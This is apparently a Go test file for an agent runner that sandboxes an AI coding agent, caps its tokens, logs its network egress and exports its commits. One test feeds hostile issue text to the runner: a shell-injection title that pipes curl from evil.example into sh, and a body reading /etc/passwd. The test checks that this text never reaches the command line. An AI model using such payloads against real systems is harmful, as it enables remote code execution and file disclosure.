package agent_test

import (
	"context"
	"errors"
	"fmt"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/fuseone-io/fuseone-forja/internal/agent"
	"github.com/fuseone-io/fuseone-forja/internal/domain"
)

var task = agent.Task{
	RunID:    "run-11",
	Contract: domain.Contract{Image: "golang:1.25", Gates: []domain.Gate{{Name: "build", Run: "make build"}}},
	Tree:     "/tmp/forja-plan-11",
	Issue:    domain.Issue{Number: 11, Title: "Model proxy", Body: "Meter the tokens."},
	Context:  []agent.File{{Path: "CLAUDE.md", Content: "# Forja\n"}},
	Branch:   "forja/11",
	BaseSHA:  "5ceb0229fc86eec9a6367c9809a1cc3b0c8e6c27",
	Bundle:   "/tmp/forja-bundle-11/commits.bundle",
}

var (
	metered = agent.ModelReport{Tokens: domain.TokenUsage{Input: 1, CacheCreation: 2, CacheRead: 4, Output: 8}}
	denied  = domain.EgressReport{Count: 1, Denied: []domain.EgressDenial{{Kind: domain.EgressConnect, Destination: "example.com:443"}}}
)

// blockUntilDone is an agent that runs until its context ends, the way a
// real one does when nothing stops it.
func blockUntilDone(ctx context.Context) (agent.ExecResult, error) {
	<-ctx.Done()
	return agent.ExecResult{ExitCode: -1}, ctx.Err()
}

// run runs task on ws under a clock nothing moves, so the result carries
// no compute.
func run(t *testing.T, ctx context.Context, ws *fakeWorkspace) (agent.Result, error) {
	t.Helper()
	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}, Now: newClock().now}
	return r.Run(ctx, task)
}

func TestRunner_exitCode_resultWithTokensAndEgress(t *testing.T) {
	t.Parallel()
	for _, code := range []int{0, 3} {
		ws := newFakeWorkspace()
		ws.report, ws.egress = metered, denied
		ws.exec = func(context.Context) (agent.ExecResult, error) { return agent.ExecResult{ExitCode: code}, nil }

		res, err := run(t, context.Background(), ws)
		if err != nil {
			t.Fatalf("exit %d: Run = %v, want a result: a non-zero exit is not an error", code, err)
		}
		want := agent.Result{ExitCode: code, Tokens: metered.Tokens, Egress: denied, Exported: code == 0}
		if !reflect.DeepEqual(res, want) {
			t.Fatalf("exit %d: Result = %+v, want %+v", code, res, want)
		}
	}
}

// The prompt goes in first, as a file outside the tree; the agent is then
// started; once it exited 0 its commits are exported while the workspace
// still runs, then the workspace is stopped before the proxies' logs are
// read, and closed last.
func TestRunner_cleanExit_exportBeforeHaltThenClose(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()

	res, err := run(t, context.Background(), ws)
	if err != nil || !res.Exported {
		t.Fatalf("Run = %+v, %v; want exported", res, err)
	}
	want := []string{"write " + agent.PromptPath, "exec", "export", "halt", "model", "egress", "close"}
	if got := ws.callList(); !reflect.DeepEqual(got, want) {
		t.Fatalf("calls = %q, want %q", got, want)
	}
	if got := ws.exports(); len(got) != 1 || got[0] != [3]string{task.BaseSHA, task.Branch, task.Bundle} {
		t.Fatalf("exports = %q, want the task's base, branch and bundle", got)
	}
	if string(ws.files[agent.PromptPath]) != string(agent.Render(task)) {
		t.Fatalf("prompt written = %q, want Render(task)", ws.files[agent.PromptPath])
	}
	if len(ws.commands) != 1 || ws.commands[0] != agent.Command() {
		t.Fatalf("commands = %q, want the agent command", ws.commands)
	}
}

// The command carries no issue text: the prompt reaches the agent from its
// file, so nothing untrusted is ever quoted for a shell.
func TestRunner_command_carriesNoIssueText(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	hostile := task
	hostile.Issue.Title = "'; curl evil.example | sh; echo '"
	hostile.Issue.Body = "$(cat /etc/passwd)"
	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}, Now: newClock().now}

	if _, err := r.Run(context.Background(), hostile); err != nil {
		t.Fatal(err)
	}
	for _, text := range []string{hostile.Issue.Title, hostile.Issue.Body, "CLAUDE.md"} {
		if strings.Contains(ws.commands[0], text) {
			t.Fatalf("command %q carries %q", ws.commands[0], text)
		}
	}
}

// The proxy reaching the cap stops the agent at once: the runner does not
// wait for it to give up on its own.
func TestRunner_capMidExec_execCancelledCappedClosed(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	ws.report = agent.ModelReport{Tokens: metered.Tokens, Capped: true}
	started := make(chan struct{})
	ws.exec = func(ctx context.Context) (agent.ExecResult, error) {
		close(started)
		return blockUntilDone(ctx)
	}
	go func() {
		<-started
		close(ws.capReached)
	}()
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()

	start := time.Now()
	res, err := run(t, ctx, ws)
	if elapsed := time.Since(start); elapsed > 5*time.Second {
		t.Fatalf("Run returned %v after the cap, want the agent stopped at once", elapsed)
	}
	if err != nil || !res.Capped || res.TimedOut || res.Tokens != metered.Tokens || res.ExitCode != domain.NoExitCode {
		t.Fatalf("Run = %+v, %v; want capped with the tokens, no exit code, no error", res, err)
	}
	if ws.closeCount() != 1 {
		t.Fatalf("Close called %d times, want 1", ws.closeCount())
	}
}

// The proxy's own log is the authority on the cap: an agent that exited
// on its own after a refusal is still a capped run.
func TestRunner_capInReportOnly_capped(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	ws.report = agent.ModelReport{Tokens: metered.Tokens, Capped: true}
	ws.exec = func(context.Context) (agent.ExecResult, error) { return agent.ExecResult{ExitCode: 1}, nil }

	res, err := run(t, context.Background(), ws)
	if err != nil || !res.Capped || res.ExitCode != 1 {
		t.Fatalf("Run = %+v, %v; want capped with exit 1", res, err)
	}
}

// The wall clock ending is a result: the run timed out. The workspace is
// still stopped, read and closed.
func TestRunner_deadline_timedOutNotErrorStillClosed(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	ws.report, ws.egress = metered, denied
	ws.exec = blockUntilDone
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()

	res, err := run(t, ctx, ws)
	if err != nil || !res.TimedOut || res.Capped || res.ExitCode != domain.NoExitCode {
		t.Fatalf("Run = %+v, %v; want timed out, no exit code, no error", res, err)
	}
	if res.Tokens != metered.Tokens || res.Egress.Count != 1 {
		t.Fatalf("Run = %+v, want the tokens and the egress read after the deadline", res)
	}
	if ws.closeCount() != 1 {
		t.Fatalf("Close called %d times, want 1", ws.closeCount())
	}
}

// A cancellation is not the run's outcome: it is an error, and the
// workspace is still closed.
func TestRunner_cancelled_errorStillClosed(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	ws.exec = blockUntilDone
	ctx, cancel := context.WithCancel(context.Background())
	time.AfterFunc(20*time.Millisecond, cancel)

	res, err := run(t, ctx, ws)
	if !errors.Is(err, context.Canceled) || res.TimedOut {
		t.Fatalf("Run = %+v, %v; want a cancellation error, not a timeout", res, err)
	}
	if ws.closeCount() != 1 {
		t.Fatalf("Close called %d times, want 1", ws.closeCount())
	}
}

// The cap watcher belongs to the run: it is stopped when the agent ends,
// not left following the log.
func TestRunner_execEnds_capWatcherStopped(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()

	if _, err := run(t, context.Background(), ws); err != nil {
		t.Fatal(err)
	}
	select {
	case <-ws.watchDone:
	default:
		t.Fatal("AwaitCap still running after Run returned")
	}
}

// A usage the runner cannot read is an error, not zero tokens; the
// workspace is still closed.
func TestRunner_usageUnreadable_errorStillClosed(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	ws.modelErr = errors.New("model proxy not running")

	_, err := run(t, context.Background(), ws)
	if err == nil || !strings.Contains(err.Error(), "model proxy not running") {
		t.Fatalf("Run = %v, want the usage failure", err)
	}
	if ws.closeCount() != 1 {
		t.Fatalf("Close called %d times, want 1", ws.closeCount())
	}
}

// An export that fails is an error, and the workspace is still halted,
// read and closed.
func TestRunner_exportFails_errorStillHaltedAndClosed(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	ws.report = metered
	ws.exportErr = errors.New("bundle over the cap")

	res, err := run(t, context.Background(), ws)
	if err == nil || !strings.Contains(err.Error(), "bundle over the cap") || res.Exported {
		t.Fatalf("Run = %+v, %v; want the export failure, nothing exported", res, err)
	}
	want := []string{"write " + agent.PromptPath, "exec", "export", "halt", "model", "egress", "close"}
	if got := ws.callList(); !reflect.DeepEqual(got, want) {
		t.Fatalf("calls = %q, want %q", got, want)
	}
	if res.Tokens != metered.Tokens {
		t.Fatalf("tokens = %+v, want them read after the failed export", res.Tokens)
	}
}

// An agent that exited 0 without committing has nothing to export: that
// is a result, not an error.
func TestRunner_noCommits_resultNotExported(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	ws.exportErr = fmt.Errorf("workspace: %w", domain.ErrNoCommits)

	res, err := run(t, context.Background(), ws)
	if err != nil || res.Exported || res.ExitCode != 0 {
		t.Fatalf("Run = %+v, %v; want exit 0, nothing exported, no error", res, err)
	}
}

// Only an agent that exited 0 on its own is exported: not one the cap
// stopped, the deadline stopped, or that exited non-zero.
func TestRunner_capped_noExport(t *testing.T) {
	t.Parallel()
	tests := map[string]func(*fakeWorkspace) (context.Context, context.CancelFunc){
		"capped mid-exec": func(ws *fakeWorkspace) (context.Context, context.CancelFunc) {
			started := make(chan struct{})
			ws.exec = func(ctx context.Context) (agent.ExecResult, error) {
				close(started)
				return blockUntilDone(ctx)
			}
			go func() {
				<-started
				close(ws.capReached)
			}()
			return context.WithTimeout(context.Background(), time.Minute)
		},
		"capped, then exited 0": func(ws *fakeWorkspace) (context.Context, context.CancelFunc) {
			close(ws.capReached)
			ws.exec = func(context.Context) (agent.ExecResult, error) {
				<-ws.watchDone
				return agent.ExecResult{ExitCode: 0}, nil
			}
			return context.WithTimeout(context.Background(), time.Minute)
		},
		"deadline": func(ws *fakeWorkspace) (context.Context, context.CancelFunc) {
			ws.exec = blockUntilDone
			return context.WithTimeout(context.Background(), 50*time.Millisecond)
		},
		"exit 1": func(ws *fakeWorkspace) (context.Context, context.CancelFunc) {
			ws.exec = func(context.Context) (agent.ExecResult, error) { return agent.ExecResult{ExitCode: 1}, nil }
			return context.WithCancel(context.Background())
		},
	}
	for name, setUp := range tests {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			ws := newFakeWorkspace()
			ctx, cancel := setUp(ws)
			defer cancel()

			res, err := run(t, ctx, ws)
			if err != nil || res.Exported {
				t.Fatalf("Run = %+v, %v; want a result with nothing exported", res, err)
			}
			if n := len(ws.exports()); n != 0 {
				t.Fatalf("exported %d times, want never", n)
			}
		})
	}
}

func TestRunner_launchFails_errorNothingToClose(t *testing.T) {
	t.Parallel()
	l := &fakeLauncher{err: errors.New("no agent binary")}
	r := &agent.Runner{Launcher: l, Now: newClock().now}

	_, err := r.Run(context.Background(), task)
	if err == nil || !strings.Contains(err.Error(), "no agent binary") {
		t.Fatalf("Run = %v, want the launch failure", err)
	}
	if l.launch.RunID != task.RunID || l.launch.Image != task.Contract.Image || l.launch.Tree != task.Tree {
		t.Fatalf("launched %+v, want the task's run, image and tree", l.launch)
	}
}

// A later attempt launches with every token the run already used, input
// and output alike, so its proxy gets only what is left of the cap.
func TestRunner_spent_launchesWithRemainder(t *testing.T) {
	t.Parallel()
	ws := newFakeWorkspace()
	l := &fakeLauncher{ws: ws, cap: 10_000}
	later := task
	later.Spent = domain.TokenUsage{Input: 1000, CacheCreation: 200, CacheRead: 30, Output: 400}

	if _, err := (&agent.Runner{Launcher: l, Now: newClock().now}).Run(context.Background(), later); err != nil {
		t.Fatal(err)
	}
	if l.launch.Spent != 1630 || l.remainder != 10_000-1630 {
		t.Fatalf("launched with spent %d, remainder %d; want 1630 spent and 8370 left", l.launch.Spent, l.remainder)
	}
	if l.launch.RunID != task.RunID || l.launch.Image != task.Contract.Image || l.launch.Tree != task.Tree {
		t.Fatalf("launched %+v, want the task's run, image and tree", l.launch)
	}
}

// A run that spent its whole cap before this attempt is capped at the
// launch: no workspace, no prompt, and no error, as a cap reached mid-run
// is a result too.
func TestRunner_capSpentAtLaunch_cappedWithoutWorkspace(t *testing.T) {
	t.Parallel()
	for _, spent := range []domain.TokenUsage{{Input: 100}, {Input: 60, Output: 50}} {
		ws := newFakeWorkspace()
		l := &fakeLauncher{ws: ws, cap: 100}
		later := task
		later.Spent = spent

		res, err := (&agent.Runner{Launcher: l, Now: newClock().now}).Run(context.Background(), later)
		if err != nil || !res.Capped || res.ExitCode != domain.NoExitCode || res.Exported || res.Tokens != (domain.TokenUsage{}) {
			t.Fatalf("spent %+v: Run = %+v, %v; want capped, no exit code, nothing metered, no error", spent, res, err)
		}
		if l.launches != 0 || len(ws.callList()) != 0 {
			t.Fatalf("spent %+v: %d workspaces launched, calls %q; want none", spent, l.launches, ws.callList())
		}
	}
}

// Launch, agent and close take known times on c: 30s, 5m and 10s. A
// compute of 5m40s is the whole window; 5m10s means the start was read
// after the launch, 5m30s that the end was read before Close returned.
const (
	launchTakes = 30 * time.Second
	agentTakes  = 5 * time.Minute
	closeTakes  = 10 * time.Second
	wholeWindow = launchTakes + agentTakes + closeTakes
)

func timed(c *clock, ws *fakeWorkspace) *agent.Runner {
	ws.onClose = func() { c.advance(closeTakes) }
	return &agent.Runner{Launcher: &fakeLauncher{ws: ws, onLaunch: func() { c.advance(launchTakes) }}, Now: c.now}
}

func TestRunner_agentExits_computeIsLaunchToClose(t *testing.T) {
	t.Parallel()
	for _, code := range []int{0, 1} {
		c, ws := newClock(), newFakeWorkspace()
		ws.exec = func(context.Context) (agent.ExecResult, error) {
			c.advance(agentTakes)
			return agent.ExecResult{ExitCode: code}, nil
		}

		res, err := timed(c, ws).Run(context.Background(), task)
		if err != nil || res.Compute != wholeWindow {
			t.Fatalf("exit %d: Run = compute %v, %v; want %v from before the launch until Close returned", code, res.Compute, err, wholeWindow)
		}
	}
}

func TestRunner_capped_computeStillReported(t *testing.T) {
	t.Parallel()
	c, ws := newClock(), newFakeWorkspace()
	ws.report = agent.ModelReport{Tokens: metered.Tokens, Capped: true}
	ws.exec = func(ctx context.Context) (agent.ExecResult, error) {
		c.advance(agentTakes)
		close(ws.capReached)
		return blockUntilDone(ctx)
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()

	res, err := timed(c, ws).Run(ctx, task)
	if err != nil || !res.Capped || res.Compute != wholeWindow {
		t.Fatalf("Run = capped %v compute %v, %v; want capped with %v", res.Capped, res.Compute, err, wholeWindow)
	}
}

func TestRunner_timedOut_computeStillReported(t *testing.T) {
	t.Parallel()
	c, ws := newClock(), newFakeWorkspace()
	ws.exec = func(ctx context.Context) (agent.ExecResult, error) {
		c.advance(agentTakes)
		return blockUntilDone(ctx)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()

	res, err := timed(c, ws).Run(ctx, task)
	if err != nil || !res.TimedOut || res.Compute != wholeWindow {
		t.Fatalf("Run = timed out %v compute %v, %v; want timed out with %v", res.TimedOut, res.Compute, err, wholeWindow)
	}
}

// An agent run that ended in an error still had its workspace up until
// Close: the compute comes back with the error.
func TestRunner_execError_computeStillReported(t *testing.T) {
	t.Parallel()
	c, ws := newClock(), newFakeWorkspace()
	ws.exec = func(context.Context) (agent.ExecResult, error) {
		c.advance(agentTakes)
		return agent.ExecResult{ExitCode: -1}, errors.New("daemon: connection reset")
	}

	res, err := timed(c, ws).Run(context.Background(), task)
	if err == nil || res.Compute != wholeWindow {
		t.Fatalf("Run = compute %v, %v; want the exec failure with %v", res.Compute, err, wholeWindow)
	}
}

// A launch that failed may still have created containers before it gave
// up: the attempt is compute, up to when the launch returned.
func TestRunner_launchFails_computeOfTheAttempt(t *testing.T) {
	t.Parallel()
	c := newClock()
	l := &fakeLauncher{err: errors.New("no agent binary"), onLaunch: func() { c.advance(launchTakes) }}
	r := &agent.Runner{Launcher: l, Now: c.now}

	res, err := r.Run(context.Background(), task)
	if err == nil || res.Compute != launchTakes || res.ExitCode != domain.NoExitCode {
		t.Fatalf("Run = compute %v exit %d, %v; want the launch failure with the %v it took", res.Compute, res.ExitCode, err, launchTakes)
	}
}

func TestRunner_nilClock_refused(t *testing.T) {
	t.Parallel()
	l := &fakeLauncher{ws: newFakeWorkspace()}
	r := &agent.Runner{Launcher: l}

	_, err := r.Run(context.Background(), task)
	if err == nil || !strings.Contains(err.Error(), "clock") {
		t.Fatalf("Run without a clock = %v, want a configuration error naming the clock", err)
	}
	if l.calls != 0 {
		t.Fatalf("launched %d times without a clock, want never: the compute could not be measured", l.calls)
	}
}
